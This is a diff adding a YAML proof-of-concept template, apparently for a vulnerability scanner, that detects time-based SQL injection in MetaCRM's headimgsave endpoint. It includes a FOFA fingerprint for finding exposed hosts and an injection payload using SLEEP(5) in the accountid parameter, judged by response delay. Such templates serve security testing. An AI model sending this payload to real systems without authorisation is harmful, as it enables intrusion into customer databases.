@@ -1,0 +1,17 @@
+id: poc-yaml-metacrm-headimgsave-sqli
+info:
+  name: MetaCRM客户关系管理系统 headimgsave SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: MetaCRM客户关系管理系统
+  fofa: body="/common/scripts/basic.js"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /headimgsave?accountid=1%27+AND+(SELECT+*+FROM+(SELECT+SLEEP(5))x)--+
+  expression: status_code == 200 && contains(body,"\"message\":\"?????\"") && !contains(body,"<")
+    && duration > 5 && duration < 7
+transport: http
